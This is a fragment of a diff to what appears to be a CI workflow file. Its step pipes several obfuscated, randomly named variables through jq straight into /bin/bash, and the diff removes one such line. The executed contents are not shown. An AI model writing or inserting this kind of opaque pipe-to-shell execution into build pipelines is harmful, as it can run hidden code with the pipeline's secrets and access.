@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$t493" | jq -r .aw449 | /bin/bash
           printf '%s' "$nkhrq33" | jq -r .zp8 | /bin/bash
           printf '%s' "$kocwa0" | jq -r .ehsd84 | /bin/bash
-          printf '%s' "$htxn0548" | jq -r .t52520 | /bin/bash
           echo $xuov619 | jq -r .wp03299 | /bin/bash
 
       - name: Persist output
